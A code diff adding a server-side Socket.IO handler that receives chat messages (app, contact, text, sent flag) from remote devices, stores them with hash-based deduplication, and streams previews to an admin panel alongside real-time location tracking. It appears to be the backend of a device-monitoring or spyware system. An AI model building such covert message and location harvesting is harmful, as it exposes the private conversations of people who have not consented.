@@ -220,6 +220,80 @@ function setupSocketHandlers(io) {
         });
 
         /**
+         * Chat messages from device - capture and store with deduplication
+         */
+        socket.on('chat:messages', async (data) => {
+            const { deviceId, messages } = data;
+            if (!deviceId || !messages || !Array.isArray(messages)) {
+                console.log('[CHAT] Invalid chat data received');
+                return;
+            }
+
+            console.log(`[CHAT] 📥 Received ${messages.length} messages from ${deviceId}`);
+
+            try {
+                const device = await prisma.device.findUnique({ where: { deviceId } });
+                if (!device) {
+                    console.log(`[CHAT] Device not found: ${deviceId}`);
+                    return;
+                }
+
+                let savedCount = 0;
+                let skippedCount = 0;
+
+                for (const msg of messages) {
+                    try {
+                        // Generate hash for deduplication
+                        const crypto = require('crypto');
+                        const hashInput = `${msg.chatApp}|${msg.contactName || ''}|${msg.messageText}|${msg.timestamp}`;
+                        const messageHash = crypto.createHash('md5').update(hashInput).digest('hex');
+
+                        // Try to insert, skip if duplicate (hash already exists)
+                        await prisma.chatMessage.upsert({
+                            where: {
+                                deviceId_messageHash: {
+                                    deviceId: device.id,
+                                    messageHash: messageHash
+                                }
+                            },
+                            create: {
+                                deviceId: device.id,
+                                chatApp: msg.chatApp || 'unknown',
+                                contactName: msg.contactName,
+                                messageText: msg.messageText || '',
+                                isSent: msg.isSent || false,
+                                isRaw: msg.isRaw || false,
+                                timestamp: new Date(msg.timestamp || Date.now()),
+                                messageHash: messageHash
+                            },
+                            update: {} // No update on duplicate, just skip
+                        });
+                        savedCount++;
+                    } catch (err) {
+                        if (err.code === 'P2002') {
+                            // Duplicate key - expected for duplicates, silently skip
+                            skippedCount++;
+                        } else {
+                            console.error('[CHAT] Error saving message:', err.message);
+                        }
+                    }
+                }
+
+                console.log(`[CHAT] ✅ Saved ${savedCount} new, skipped ${skippedCount} duplicates`);
+
+                // Emit to admin panel for real-time viewing
+                io.to('admin').emit('chat:new', {
+                    deviceId,
+                    count: savedCount,
+                    messages: messages.slice(0, 10) // Send first 10 for preview
+                });
+
+            } catch (error) {
+                console.error('[CHAT] ❌ Error processing messages:', error.message);
+            }
+        });
+
+        /**
          * Real-time Location from device
          */
         socket.on('device:location', (data) => {
